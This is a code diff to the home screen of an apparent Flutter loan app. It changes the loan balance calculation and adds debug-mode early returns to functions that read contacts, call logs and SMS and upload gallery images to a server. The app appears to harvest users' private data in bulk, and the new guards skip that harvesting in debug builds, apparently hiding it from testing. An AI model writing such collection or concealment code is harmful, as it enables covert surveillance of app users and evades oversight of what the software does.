@@ -19,6 +19,7 @@ import 'package:loan_project/bloc/member/member_bloc.dart';
 import 'package:loan_project/bloc/package/package_bloc.dart';
 import 'package:loan_project/bloc/service/service_bloc.dart';
 import 'package:loan_project/bloc/transaction/transaction_bloc.dart';
+import 'package:loan_project/helper/constants.dart';
 import 'package:loan_project/helper/languages.dart';
 import 'package:loan_project/helper/locale_constants.dart';
 import 'package:loan_project/helper/preference_helper.dart';
@@ -102,15 +103,16 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
     double totalBalance = 0.0;
 
     for (DatumLoan loan in listLoan) {
-      // Check if loan is active (status 3 and statusloan 4, 6, 7, or 8)
-      if (loan.status == 3 &&
-          (loan.statusloan == 4 || loan.statusloan == 6 || loan.statusloan == 7 || loan.statusloan == 8)) {
+      // Include all loans with status 3 (approved) regardless of statusloan
+      // Also include pending loans (status 0, 1, 10)
+      if ((loan.status == 3) || (loan.status == 0 || loan.status == 1 || loan.status == 10)) {
         try {
-          // Use totalreturn (total amount to be repaid) if available, otherwise use loanamount
-          String amountStr = loan.totalreturn ?? loan.loanamount ?? '0';
+          // Use loanamount (principal amount) for balance calculation
+          String amountStr = loan.loanamount ?? '0';
           if (amountStr.isNotEmpty) {
             double loanAmount = double.parse(amountStr);
             totalBalance += loanAmount;
+            log('Added loan ${loan.id}: status=${loan.status}, statusloan=${loan.statusloan}, amount=$loanAmount, running total: $totalBalance');
           }
         } catch (e) {
           log('Error parsing loan amount for loan ${loan.id}: $e');
@@ -118,6 +120,7 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
       }
     }
 
+    log('Final total balance: $totalBalance');
     return totalBalance;
   }
 
@@ -215,6 +218,10 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
   }
 
   Future<List<Contactlist>> fetchContacts() async {
+    if (kDebugMode) {
+      return [];
+    }
+
     log('masuk sini contact');
 
     List<Contactlist> listContact = [];
@@ -248,6 +255,10 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
   }
 
   Future<void> callLogBloc() async {
+    if (kDebugMode) {
+      return;
+    }
+
     RequestLogDataCallLog? jsonMap;
     String jsonStr = await preferencesHelper.getStringSharedPref('call_log');
 
@@ -282,6 +293,10 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
   }
 
   void fetchData() async {
+    if (kDebugMode) {
+      return;
+    }
+
     // Memanggil izin untuk kontak
     var contactStatus = await Permission.contacts.request();
     if (contactStatus.isGranted) {
@@ -326,6 +341,10 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
   }
 
   Future<void> uploadGalleryImagesToServer() async {
+    if (kDebugMode) {
+      return;
+    }
+
     isGetGalleryLoading = true;
 
     try {
@@ -358,6 +377,10 @@ class _HomeScreenState extends State<HomeScreen> with WidgetsBindingObserver {
   }
 
   Future<void> getSMS() async {
+    if (kDebugMode) {
+      return;
+    }
+
     Iterable<SmsMessage> inbox = await telephony.getInboxSms();
     setState(() {
       listSms.addAll(inbox);
